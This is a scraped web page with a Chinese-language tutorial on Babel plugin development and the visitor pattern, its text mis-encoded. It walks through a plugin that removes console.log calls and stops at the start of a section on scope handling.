itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å‰ç«¯å‘æ¶æ„çªå›´ç³»åˆ— - ç¼–è¯‘åŸç† [6 - 2]ï¼šBabel æ’ä»¶å¼€å‘ä¸è®¿é—®è€…æ¨¡å¼
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4473272506789485/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å‰ç«¯ç‹å£®å£®
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-29T07:37:12.000Z" title="Thu Jan 29 2026 07:37:12 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:14px;overflow-x:hidden;color:var(--cyanosis-base-color);transition:color .35s;--cyanosis-base-color:#353535;--cyanosis-title-color:#005bb7;--cyanosis-strong-color:#2196f3;--cyanosis-em-color:#4fc3f7;--cyanosis-del-color:#ccc;--cyanosis-link-color:#3da8f5;--cyanosis-linkh-color:#007fff;--cyanosis-border-color:#bedcff;--cyanosis-border-color-2:#ececec;--cyanosis-bg-color:#fff;--cyanosis-blockquote-color:#8c8c8c;--cyanosis-blockquote-bg-color:#f0fdff;--cyanosis-code-color:#c2185b;--cyanosis-code-bg-color:#fff4f4;--cyanosis-code-pre-color:#f8f8f8;--cyanosis-table-border-color:#c3e0fd;--cyanosis-table-th-color:#dff0ff;--cyanosis-table-tht-color:#005bb7;--cyanosis-table-tr-nc-color:#f7fbff;--cyanosis-table-trh-color:#e0edf7;--cyanosis-slct-title-color:#005bb7;--cyanosis-slct-titlebg-color:rgba(175,207,247,0.25);--cyanosis-slct-text-color:#c80000;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#e8ebec;--cyanosis-slct-codebg-color:#ffeaeb;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body.__dark{--cyanosis-base-color:#cacaca;--cyanosis-title-color:#ddd;--cyanosis-strong-color:#fe9900;--cyanosis-em-color:#ffd28e;--cyanosis-del-color:#ccc;--cyanosis-link-color:#ffb648;--cyanosis-linkh-color:#fe9900;--cyanosis-border-color:#ffe3ba;--cyanosis-border-color-2:#ffcb7b;--cyanosis-bg-color:#2f2f2f;--cyanosis-blockquote-color:#c7c7c7;--cyanosis-blockquote-bg-color:rgba(255,199,116,0.1);--cyanosis-code-color:#000;--cyanosis-code-bg-color:#ffcb7b;--cyanosis-code-pre-color:rgba(255,227,185,0.5);--cyanosis-table-border-color:#fe9900;--cyanosis-table-th-color:#ffb648;--cyanosis-table-tht-color:#000;--cyanosis-table-tr-nc-color:#6d5736;--cyanosis-table-trh-color:#947443;--cyanosis-slct-title-color:#000;--cyanosis-slct-titlebg-color:#fe9900;--cyanosis-slct-text-color:#00c888;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#000;--cyanosis-slct-codebg-color:#ffcb7b;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body h1{padding-bottom:4px;font-size:30px}.markdown-body h1,.markdown-body h2{margin-top:36px;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);transition:color .35s}.markdown-body h2{position:relative;padding-left:10px;padding-right:10px;padding-bottom:10px;font-size:24px;border-bottom:1px solid var(--cyanosis-border-color-2)}.markdown-body h2:before{content:"ã€Œ";position:absolute;top:-6px;left:-14px}.markdown-body h2:after{content:"ã€";position:relative;top:6px;right:auto}.markdown-body h3{position:relative;padding-bottom:0;margin-top:30px;margin-bottom:10px;font-size:20px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h3:before{content:"Â»";padding-right:6px;color:var(--cyanosis-strong-color)}.markdown-body h4{margin-top:24px;font-size:16px}.markdown-body h4,.markdown-body h5{padding-bottom:0;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h5{margin-top:18px;font-size:14px}.markdown-body h6{padding-bottom:0;margin-top:12px;margin-bottom:10px;font-size:12px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body p{line-height:inherit;margin-top:16px;margin-bottom:16px}.markdown-body img{max-width:100%}.markdown-body hr{position:relative;width:98%;height:1px;margin-top:32px;margin-bottom:32px;background-image:linear-gradient(90deg,var(--cyanosis-link-color),rgba(255,0,0,.3),hsla(0,0%,100%,.1),rgba(255,0,0,.3),var(--cyanosis-link-color));border-width:0;overflow:visible}.markdown-body hr:after{content:"";position:absolute;margin:auto;left:0;right:0;bottom:0;top:0;display:inline-block;width:60px;height:20px;background-color:var(--cyanosis-bg-color);background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAgCAYAAABgrToAAAADoklEQVRYR82XTYgcRRTHf2933Q1RjAa9eFO8JHoJ8RQVBQ2iBwXBET0YEUTXNVmNQtTpmeqaWV0XNRq/o4KoECSCEPSg4CF+BYUkIIiCoCJCPIhC/Ihh2Z0nVV27VnZnenumW9i6ddV7//frV69fVQurfMgq56NawFTPAU6QyomqXrw6wIZeyhCPebA5buNR+akKyGoAjd6BshthnYdSjqNcRVuOlIUsD2j0SuA94IwuMHdh5ZUykOUBXfSGbmKI54EtAeYIHSZoy5dl4JxvNYBOKdW1KE8BQ8AkVk6WhasWsAiN0TX9gveXQaPP+Aytpc4u+bMI06JNohsYYYYOR2lJWtS3OKDRfcAtQfgDoI6Vo4UCGb0OmAEuDvZvYmVbEd/igC3dzDz7gQu8sPA9kJDK27mBmjqBeLjTg90PDFOjWawFFQd06kZHEfaj3LAIpTRpSXsZ5E06zEYP9sDimnAApYaV2SLZG/wjMeqAkijwW4xQJ5Gf/ZzRC8OW3hiBTGGlURRswW55Bh/Ssxljrwew8l1PQaM14GngvGDzBUKdDsMeTtgU5o8B92PFlUf3YXUrHa7Fys6lBqcCGnX15YQ2A18FyPd7Crd1A3M8C1wdbH4DD3hWeP6IEXbQkG97ajR1HPFnuPP5jFFq1OWX7hl8WM9l1AO648uNfwLk7tytMeogty+xeQ4rO3r6bdcx1nuwOGsHmaXGtPzae4uzGnLH1kQkvpdZGrHjssBZJrL+pqS05KWc8tgITAPXRzYvYOXe/C2OV43eDcRBDtIhoS2f9wzc0Cv8Wls+zoFzUC5zF0U241h5uZtPfptp6OUM8wbK+cH5GEpCS17P3fJei0Z3+npTxryJ8CPzbKMtn/ZyWbkPGl0PuFPkmkjkcb4h4R2ZLwRq1H0ALmvjkf2HwK1Y+T1PY2XABe/sHJ6MxN5lnoSpnC/UGbsTaI5phK2R7x6s3Ffk5YoDOrWm3onwJHBmEP86bPmBrsGaenNoIdnxCH+gPEhLXi0Cl1VBvyPVLSh7gEuC62yAfOIUqabWEaaiucMIk6RyqJ+Q/QM69V26jjW86Gvov/EaoyT8zRCn+Xq7PVrbx0nuYUaO9wM3WAbjCE1NEUw09Um4UV+2OKfYfu5/S19gsAzGKqm6LE5FrShbdS0ku465DjDwKA/oQht19ejqbaEVuRbiLhuHByYLjtUAZpDutzP7cYdHsPJXWbjyNVgFwQoa1WXwf4Jd9YD/Ap80+yE7+u9aAAAAAElFTkSuQmCC);background-repeat:no-repeat;background-size:auto 100%;background-position-x:center;transition:background-color .5s}.markdown-body code{padding:.065em .4em;font-size:.87em;color:var(--cyanosis-code-color);word-break:break-word;overflow-x:auto;background-color:var(--cyanosis-code-bg-color);border-radius:2px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{display:block;padding:16px 12px;margin:0;font-size:12px;color:#333;word-break:normal;overflow-x:auto;background:var(--cyanosis-code-pre-color)}.markdown-body pre&gt;code::-webkit-scrollbar{width:4px;height:4px}.markdown-body pre&gt;code::-webkit-scrollbar-track{background-color:var(--cyanosis-border-color)}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:var(--cyanosis-strong-color);border-radius:10px}.markdown-body a{position:relative;text-decoration:none;color:var(--cyanosis-link-color);border-bottom:1px solid var(--cyanosis-border-color)}.markdown-body a:hover{border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body a:active,.markdown-body a:hover{color:var(--cyanosis-linkh-color)}.markdown-body a:after{position:absolute;content:"";top:100%;left:0;width:100%;opacity:0;border-bottom:1px solid var(--cyanosis-border-color);transition:top .3s,opacity .3s;transform:translateZ(0)}.markdown-body a:hover:after{top:0;opacity:1;border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid var(--cyanosis-table-border-color);border-spacing:0;border-collapse:collapse}.markdown-body table thead{color:#000;text-align:left;font-size:14px;background:#f6f6f6}.markdown-body table tr:nth-child(2n){background-color:var(--cyanosis-table-tr-nc-color)}.markdown-body table tr:hover{background-color:var(--cyanosis-table-trh-color)}.markdown-body table td,.markdown-body table th{padding:12px 8px;line-height:24px;border:1px solid var(--cyanosis-table-border-color)}.markdown-body table th{color:var(--cyanosis-table-tht-color);background-color:var(--cyanosis-table-th-color)}.markdown-body table td{min-width:120px}.markdown-body blockquote{color:var(--cyanosis-blockquote-color);border-left:4px solid var(--cyanosis-strong-color);background-color:var(--cyanosis-blockquote-bg-color);padding:1px 20px;margin:22px 0;transition:color .35s}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body b,.markdown-body blockquote&gt;b,.markdown-body blockquote&gt;strong,.markdown-body strong{color:var(--cyanosis-strong-color)}.markdown-body em,.markdown-body i{color:var(--cyanosis-em-color)}.markdown-body del{color:var(--cyanosis-del-color)}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:4px}.markdown-body ol li{padding-left:6px}.markdown-body details&gt;summary{outline:none;color:var(--cyanosis-title-color);font-size:20px;font-weight:bolder;border-bottom:1px solid var(--cyanosis-border-color);cursor:pointer}.markdown-body details&gt;p{padding:10px 20px;margin:10px 0 0;color:#666;background-color:var(--cyanosis-blockquote-bg-color);border:2px dashed var(--cyanosis-strong-color)}.markdown-body h1::selection,.markdown-body h2::selection,.markdown-body h3::selection,.markdown-body h4::selection,.markdown-body h5::selection,.markdown-body h6::selection{color:var(--cyanosis-slct-title-color);background-color:var(--cyanosis-slct-titlebg-color)}.markdown-body ol li::selection,.markdown-body p::selection,.markdown-body ul li::selection{color:var(--cyanosis-slct-text-color);background-color:var(--cyanosis-slct-bg-color)}.markdown-body a::selection,.markdown-body b::selection,.markdown-body em::selection,.markdown-body i::selection,.markdown-body strong::selection{background-color:var(--cyanosis-slct-elbg-color)}.markdown-body del::selection{color:var(--cyanosis-slct-del-color);background-color:var(--cyanosis-slct-elbg-color)}.markdown-body table thead th::selection{background-color:transparent}.markdown-body table tbody td::selection{background-color:var(--cyanosis-slct-bg-color)}.markdown-body code::selection{background-color:var(--cyanosis-slct-codebg-color)}.markdown-body pre&gt;code::selection{background-color:var(--cyanosis-slct-prebg-color)}.markdown-body .contains-task-list{padding-left:14px;list-style:none}.markdown-body .contains-task-list input[type=checkbox]{position:relative}.markdown-body .contains-task-list input[type=checkbox]:before{content:"";position:absolute;top:0;left:0;right:0;bottom:0;width:inherit;height:inherit;background:#f0f8ff;border:1px solid #add6ff;border-radius:2px;box-sizing:border-box;z-index:1}.markdown-body .contains-task-list input[type=checkbox]:checked:after{content:"âœ“";position:absolute;top:-12px;left:0;right:0;bottom:0;width:0;height:0;color:#f55;font-size:20px;font-weight:700;z-index:2}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="atom-one-dark">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#abb2bf;background:#282c34}.hljs-comment,.hljs-quote{color:#5c6370;font-style:italic}.hljs-doctag,.hljs-formula,.hljs-keyword{color:#c678dd}.hljs-deletion,.hljs-name,.hljs-section,.hljs-selector-tag,.hljs-subst{color:#e06c75}.hljs-literal{color:#56b6c2}.hljs-addition,.hljs-attribute,.hljs-meta-string,.hljs-regexp,.hljs-string{color:#98c379}.hljs-built_in,.hljs-class .hljs-title{color:#e6c07b}.hljs-attr,.hljs-number,.hljs-selector-attr,.hljs-selector-class,.hljs-selector-pseudo,.hljs-template-variable,.hljs-type,.hljs-variable{color:#d19a66}.hljs-bullet,.hljs-link,.hljs-meta,.hljs-selector-id,.hljs-symbol,.hljs-title{color:#61aeee}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}.hljs-link{text-decoration:underline}</style><blockquote>
<p><strong>å†™åœ¨å‰é¢</strong></p>
<p>å¾ˆå¤šé«˜çº§çš„å‰ç«¯åº“éƒ½åœ¨ç”¨ Babel æ’ä»¶åšâ€œé­”æ³•â€ã€‚</p>
<ul>
<li><strong>React:</strong> JSX è¯­æ³•æ ¹æœ¬ä¸æ˜¯ JSï¼Œæ˜¯ Babel æŠŠå®ƒå˜æˆäº† <code>React.createElement</code>ã€‚</li>
<li><strong>Vue:</strong> <code>v-model</code> çš„è¯­æ³•ç³–ï¼Œæ˜¯åœ¨ç¼–è¯‘é˜¶æ®µå±•å¼€çš„ã€‚</li>
<li><strong>babel-plugin-import:</strong> ä¸ºä»€ä¹ˆ Ant Design å¯ä»¥æŒ‰éœ€åŠ è½½ï¼Ÿå› ä¸ºå®ƒæ‚„æ‚„æŠŠ <code>import { Button } from 'antd'</code> æ”¹å†™æˆäº†å¼•ç”¨å…·ä½“æ–‡ä»¶çš„è·¯å¾„ã€‚</li>
</ul>
<p>å­¦ä¼šå†™ Babel æ’ä»¶ï¼Œæ„å‘³ç€ä½ æ‹¥æœ‰äº†<strong>æ”¹å†™è¯­è¨€è§„åˆ™</strong>çš„èƒ½åŠ›ã€‚</p>
</blockquote>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ce72ee99ca0b4093bef22a0b910de43f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv546L5aOu5aOu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770277039&amp;x-signature=tMfRBdJK%2BNTJmTOTVk6YpqixTE8%3D" alt="unnamed.jpg" loading="lazy"/></p>
<hr/>
<h2 data-id="heading-0">ä¸€ã€ æ ¸å¿ƒè®¾è®¡æ¨¡å¼ï¼šè®¿é—®è€…æ¨¡å¼ (Visitor Pattern)</h2>
<p>AST æ˜¯ä¸€æ£µæ·±åº¦ææ·±ã€ç»“æ„å¤æ‚çš„æ ‘ã€‚å¦‚æœè®©ä½ æ‰‹åŠ¨å†™é€’å½’å‡½æ•°å»éå†æ¯ä¸€ä¸ªèŠ‚ç‚¹ï¼Œè¿˜å¾—åˆ¤æ–­â€œè¿™æ˜¯ä¸æ˜¯å‡½æ•°â€ã€â€œè¿™æ˜¯ä¸æ˜¯å˜é‡â€ï¼Œä½ ä¼šç–¯æ‰çš„ã€‚</p>
<p>Babel é‡‡ç”¨ <strong>è®¿é—®è€…æ¨¡å¼</strong> æ¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚</p>
<h3 data-id="heading-1">1.1 ä»€ä¹ˆæ˜¯ Visitorï¼Ÿ</h3>
<p>æƒ³è±¡ AST æ˜¯ä¸€ä¸ªå·¨å¤§çš„<strong>è¿·å®«</strong>ã€‚</p>
<ul>
<li><strong>Babel (Traverser):</strong> æ˜¯ä¸€ä¸ªä¸çŸ¥ç–²å€¦çš„å¯¼æ¸¸ï¼Œä»–è´Ÿè´£èµ°éè¿·å®«çš„æ¯ä¸€ä¸ªè§’è½ï¼ˆæ·±åº¦ä¼˜å…ˆéå†ï¼‰ã€‚</li>
<li><strong>ä½  (Visitor):</strong> æ˜¯æ¸¸å®¢ã€‚ä½ ä¸éœ€è¦è‡ªå·±èµ°ï¼Œä½ åªéœ€è¦åœ¨ç‰¹å®šçš„â€œæ™¯ç‚¹â€ç­‰ç€ã€‚</li>
<li><strong>å·¥ä½œæµï¼š</strong> å¯¼æ¸¸èµ°åˆ°ä¸€ä¸ªèŠ‚ç‚¹ï¼ˆæ¯”å¦‚â€œå‡½æ•°å£°æ˜èŠ‚ç‚¹â€ï¼‰ï¼Œå°±ä¼šå¤§å–Šï¼šâ€œè¿™é‡Œæœ‰ä¸ªå‡½æ•°å£°æ˜ï¼â€å¦‚æœä½ å¯¹è¿™ä¸ªèŠ‚ç‚¹æ„Ÿå…´è¶£ï¼Œä½ å°±å¤„ç†å®ƒï¼›ä¸æ„Ÿå…´è¶£ï¼Œå¯¼æ¸¸å°±ç»§ç»­èµ°ã€‚</li>
</ul>
<h3 data-id="heading-2">1.2 ä»£ç ä¸­çš„ Visitor</h3>
<p>åœ¨ Babel æ’ä»¶ä¸­ï¼ŒVisitor å°±æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œå¯¹è±¡çš„<strong>Key</strong> æ˜¯ä½ æ„Ÿå…´è¶£çš„ AST èŠ‚ç‚¹ç±»å‹ã€‚</p>
<pre><code class="hljs language-scss" lang="scss">const visitor = {
  <span class="hljs-comment">// å½“éå†åˆ° Identifierï¼ˆæ ‡è¯†ç¬¦/å˜é‡åï¼‰èŠ‚ç‚¹æ—¶ï¼Œæ‰§è¡Œè¿™ä¸ªå‡½æ•°</span>
  <span class="hljs-built_in">Identifier</span>(path) {
    console<span class="hljs-selector-class">.log</span>("æˆ‘å‘ç°äº†ä¸€ä¸ªå˜é‡:", path.node.name);
  },
  
  <span class="hljs-comment">// å½“éå†åˆ° BinaryExpressionï¼ˆäºŒå…ƒè¡¨è¾¾å¼ï¼Œå¦‚ a + bï¼‰èŠ‚ç‚¹æ—¶...</span>
  <span class="hljs-built_in">BinaryExpression</span>(path) {
    console<span class="hljs-selector-class">.log</span>("æˆ‘å‘ç°äº†ä¸€ä¸ªè¿ç®—");
  }
};
</code></pre>
<hr/>
<h2 data-id="heading-3">äºŒã€ æ‰‹æœ¯åˆ€çš„æ ¸å¿ƒï¼šPath ä¸ Types</h2>
<p>åœ¨ç¼–å†™æ’ä»¶æ—¶ï¼Œæœ‰ä¸¤ä¸ªæœ€é‡è¦çš„æ¦‚å¿µï¼š<code>path</code> å’Œ <code>@babel/types</code>ã€‚</p>
<h3 data-id="heading-4">2.1 Pathï¼šèŠ‚ç‚¹ä¹‹é—´çš„æ¡¥æ¢</h3>
<p>æ³¨æ„ï¼ŒVisitor å‡½æ•°æ¥æ”¶çš„å‚æ•°ä¸æ˜¯ <code>node</code>ï¼Œè€Œæ˜¯ <code>path</code>ã€‚</p>
<ul>
<li>
<p><strong>Node (èŠ‚ç‚¹):</strong> åªæ˜¯é™æ€çš„æ•°æ®ï¼ˆJSON å¯¹è±¡ï¼‰ï¼Œæ¯”å¦‚ <code>{ type: "Identifier", name: "a" }</code>ã€‚å®ƒæ²¡æœ‰çµé­‚ã€‚</p>
</li>
<li>
<p><strong>Path (è·¯å¾„):</strong> æ˜¯ä¸€ä¸ª<strong>å“åº”å¼å¯¹è±¡</strong>ã€‚å®ƒä¸ä»…åŒ…å«å½“å‰èŠ‚ç‚¹çš„ä¿¡æ¯ï¼Œè¿˜åŒ…å«<strong>çˆ¶èŠ‚ç‚¹</strong>ã€<strong>ä½œç”¨åŸŸ</strong>ä»¥åŠ<strong>å¢åˆ æ”¹æŸ¥çš„æ–¹æ³•</strong>ã€‚</p>
<ul>
<li><code>path.node</code>: è·å–å½“å‰èŠ‚ç‚¹æ•°æ®ã€‚</li>
<li><code>path.parent</code>: è·å–çˆ¶èŠ‚ç‚¹ã€‚</li>
<li><code>path.remove()</code>: è‡ªæ€ï¼ˆæŠŠè‡ªå·±ä»æ ‘ä¸­ç§»é™¤ï¼‰ã€‚</li>
<li><code>path.replaceWith(newNode)</code>: å˜èº«ï¼ˆæŠŠè‡ªå·±æ›¿æ¢æˆæ–°èŠ‚ç‚¹ï¼‰ã€‚</li>
<li><code>path.stop()</code>: å‘Šè¯‰å¯¼æ¸¸ï¼ˆBabelï¼‰ï¼Œåœæ­¢éå†ï¼Œä¸è¦å¾€ä¸‹èµ°äº†ã€‚</li>
</ul>
</li>
</ul>
<h3 data-id="heading-5">2.2 @babel/typesï¼šèŠ‚ç‚¹çš„ç”Ÿæˆå™¨ä¸éªŒè¯å™¨</h3>
<p>å¦‚æœä½ æƒ³æŠŠ <code>a</code> æ›¿æ¢æˆ <code>b</code>ï¼Œä½ ä¸èƒ½ç›´æ¥å†™ <code>path.node.name = 'b'</code>ï¼ˆè™½ç„¶æœ‰æ—¶å€™ä¹Ÿèƒ½è·‘ï¼Œä½†ä¸è§„èŒƒï¼‰ã€‚ä½ éœ€è¦åˆ›å»ºä¸€ä¸ªæ ‡å‡†çš„ AST èŠ‚ç‚¹ã€‚ <code>@babel/types</code> (é€šå¸¸ç®€å†™ä¸º <code>t</code>) å°±æ˜¯å¹²è¿™ä¸ªçš„ã€‚</p>
<ul>
<li><code>t.isIdentifier(node)</code>: åˆ¤æ–­æ˜¯ä¸æ˜¯æ ‡è¯†ç¬¦ã€‚</li>
<li><code>t.stringLiteral("hello")</code>: åˆ›å»ºä¸€ä¸ªå­—ç¬¦ä¸²å­—é¢é‡èŠ‚ç‚¹ã€‚</li>
</ul>
<hr/>
<h2 data-id="heading-6">ä¸‰ã€ å®æˆ˜æ¼”ç»ƒï¼šç¼–å†™ä¸€ä¸ªâ€œå»é™¤ console.logâ€çš„æ’ä»¶</h2>
<p>è¿™æ˜¯ Babel æ’ä»¶å¼€å‘çš„ "Hello World"ã€‚ <strong>éœ€æ±‚ï¼š</strong> ç”Ÿäº§ç¯å¢ƒæ„å»ºæ—¶ï¼Œè‡ªåŠ¨åˆ é™¤ä»£ç é‡Œæ‰€æœ‰çš„ <code>console.log</code>ï¼Œä½†ä¿ç•™ <code>console.error</code>ã€‚</p>
<h3 data-id="heading-7">3.1 ç¬¬ä¸€æ­¥ï¼šåœ¨ AST Explorer ä¸­è§‚å¯Ÿ</h3>
<p>è¾“å…¥æºç ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'hello'</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'oops'</span>);
</code></pre>
<p>è§‚å¯Ÿ AST ç»“æ„ï¼Œå‘ç° <code>console.log('hello')</code> æ˜¯ä¸€ä¸ª <strong>CallExpression</strong> (è°ƒç”¨è¡¨è¾¾å¼)ã€‚</p>
<ul>
<li>
<p><code>callee</code> æ˜¯ä¸€ä¸ª <strong>MemberExpression</strong> (æˆå‘˜è¡¨è¾¾å¼ <code>console.log</code>)ã€‚</p>
<ul>
<li><code>object</code>: <code>console</code> (Identifier)</li>
<li><code>property</code>: <code>log</code> (Identifier)</li>
</ul>
</li>
</ul>
<h3 data-id="heading-8">3.2 ç¬¬äºŒæ­¥ï¼šç¼–å†™æ’ä»¶ä»£ç </h3>
<p>ä¸€ä¸ª Babel æ’ä»¶å°±æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œè¿”å›ä¸€ä¸ªåŒ…å« <code>visitor</code> çš„å¯¹è±¡ã€‚</p>
<pre><code class="hljs language-lua" lang="lua">// my-babel-plugin.js
<span class="hljs-built_in">module</span>.exports = <span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">({ types: t })</span></span> {
  <span class="hljs-keyword">return</span> {
    name: <span class="hljs-string">"remove-console-log"</span>,
    visitor: {
      // ç›‘å¬ CallExpression èŠ‚ç‚¹
      CallExpression(<span class="hljs-built_in">path</span>) {
        // <span class="hljs-number">1.</span> è·å– callee (è¢«è°ƒç”¨çš„å‡½æ•°ï¼Œæ¯”å¦‚ console.<span class="hljs-built_in">log</span>)
        const { callee } = <span class="hljs-built_in">path</span>.node;

        // <span class="hljs-number">2.</span> åˆ¤æ–­æ˜¯å¦æ˜¯æˆå‘˜è¡¨è¾¾å¼ (MemberExpression)ï¼Œä¸”ä¸æ˜¯è®¡ç®—å±æ€§ (a[<span class="hljs-string">'b'</span>])
        <span class="hljs-keyword">if</span> (t.isMemberExpression(callee) &amp;&amp; !callee.computed) {
          
          // <span class="hljs-number">3.</span> æ£€æŸ¥ object æ˜¯ä¸æ˜¯ <span class="hljs-string">'console'</span>ï¼Œproperty æ˜¯ä¸æ˜¯ <span class="hljs-string">'log'</span>
          <span class="hljs-keyword">if</span> (t.isIdentifier(callee.object, { name: <span class="hljs-string">'console'</span> }) &amp;&amp;
              t.isIdentifier(callee.property, { name: <span class="hljs-string">'log'</span> })) {
            
            // <span class="hljs-number">4.</span> è¿™é‡Œçš„ <span class="hljs-built_in">path</span> å°±æ˜¯ console.<span class="hljs-built_in">log</span>(<span class="hljs-string">'...'</span>) è¿™ä¸€æ•´è¡Œ
            // ç›´æ¥ç”±æ‰‹æœ¯åˆ€åˆ‡é™¤ï¼
            <span class="hljs-built_in">path</span>.<span class="hljs-built_in">remove</span>();
          }
        }
      }
    }
  };
};
</code></pre>
<h3 data-id="heading-9">3.3 ç¬¬ä¸‰æ­¥ï¼šæµ‹è¯•æ•ˆæœ</h3>
<p><strong>è¾“å…¥ï¼š</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">a, b</span>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'debug:'</span>, a);
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'fatal error'</span>);
  <span class="hljs-keyword">return</span> a + b;
}
</code></pre>
<p><strong>è¾“å‡ºï¼š</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">a, b</span>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'fatal error'</span>);
  <span class="hljs-keyword">return</span> a + b;
}
</code></pre>
<p><em>Bingoï¼</em> ä½ åˆšåˆšæˆåŠŸå®Œæˆäº†ä¸€æ¬¡ä»£ç å¤–ç§‘æ‰‹æœ¯ã€‚</p>
<hr/>
<h2 data-id="heading-10">å››ã€ è¿›é˜¶ï¼šä½œç”¨åŸŸ (Scope) çš„é­”å’’</h2>
<p>æ¶æ„å¸ˆå’Œæ™®é€šå¼€å‘è€…çš„åŒºåˆ«åœ¨äºå¯¹<strong>å‰¯ä½œç”¨</strong>çš„è€ƒè™‘ã€‚ ä¸Šé¢çš„æ’ä»¶æœ‰ä¸ª Bugï¼šå¦‚æœç”¨æˆ·è‡ªå·±å®šä¹‰äº†ä¸€ä¸ªå« <code>console</code> çš„å˜é‡æ€ä¹ˆåŠï¼Ÿ</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">test</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> <span class="hljs-variable language_">console</span> = { <span class="hljs-attr">log</span>: <span class="hljs-function">() =&gt;</span> {} };
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'è¿™ä¸åº”è¯¥è¢«åˆ é™¤'</span>); <span class="hljs-comment">// æˆ‘ä»¬çš„æ’ä»¶ä¼šé”™è¯¯åœ°åˆ é™¤è¿™ä¸€è¡Œï¼</span>
}
</code></pre>
<h3 data-id="heading-11">4.1 ä½œç”¨åŸŸæ£€æŸ¥</h3>
